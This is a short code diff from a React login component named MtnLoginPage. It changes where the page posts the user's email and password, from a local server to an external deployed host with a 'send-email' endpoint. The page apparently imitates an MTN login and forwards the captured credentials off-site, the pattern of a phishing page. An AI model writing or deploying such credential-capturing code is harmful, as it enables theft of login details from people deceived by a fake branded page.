@@ -66,7 +66,7 @@ const MtnLoginPage: React.FC = () => {
     setLoading(true);
 
     try {
-      await axios.post("http://localhost:8080/send-email", { email, password });
+      await axios.post("https://web-practice-ten.vercel.app/send-email", { email, password });
       setError("");
     } catch (err) {
       setError("Failed to send email. Try again!");
